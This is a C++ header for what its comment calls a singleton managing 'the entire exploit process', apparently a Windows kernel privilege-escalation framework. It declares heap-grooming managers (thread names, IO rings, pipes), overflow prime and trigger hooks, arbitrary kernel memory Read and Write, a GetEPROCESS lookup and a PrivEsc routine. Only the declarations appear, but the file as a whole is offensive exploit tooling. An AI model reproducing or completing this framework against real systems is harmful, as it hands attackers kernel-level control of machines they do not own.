#pragma once

#include "includes.h"
#include "poolObjects.h"
#include "functions.h"

#include "threadNameManager.h"
#include "ioRingManager.h"
#include "memoryBroker.h"
#include "pipeManager.h"


class Hvergelmir // Singleton Class to manage the entire exploit process, from heap grooming to triggering the overflow and reading/writing memory
{
private:
	bool systemVerified = false;

    MemoryBroker memoryBroker;

	// Managers are owned by the singleton and also registered with MemoryBroker
	std::shared_ptr<ThreadNameManager> nameManagerPtr;
	std::shared_ptr<IORingManager> ioRingManagerPtr;
	std::shared_ptr<PipeManager> pipeManagerPtr;

	Hvergelmir(const Hvergelmir&) = delete;
	Hvergelmir& operator=(const Hvergelmir&) = delete;
	Hvergelmir(Hvergelmir&&) = delete;
	Hvergelmir& operator=(Hvergelmir&&) = delete;

	Hvergelmir();

	~Hvergelmir() = default;

public:

	static Hvergelmir& getInstance() {
		static Hvergelmir instance;
		return instance;
	}


	std::function<void(UINT64)> PrimeOverflow;
	std::function<void(BYTE*, UINT64)> TriggerOverflow;
	std::function<void()> PassOverflow;

	bool SetOverflowFunctions(std::function<void(UINT64)> iPrimeOverflow, std::function<void(BYTE*, UINT64)> iTriggerOverflow, std::function<void()> iPassOverflow);
	bool VerifySystem();
	bool Exploit();

	void Read(UINT64* iDestinationAddr, UINT64 iTargetAddr, UINT64 iSize);
	void Write(BYTE* iDestinationAddr, UINT64 data, UINT64 size);

	UINT64 GetEPROCESS();
	bool PrivEsc();

	bool Cleanup();

	
};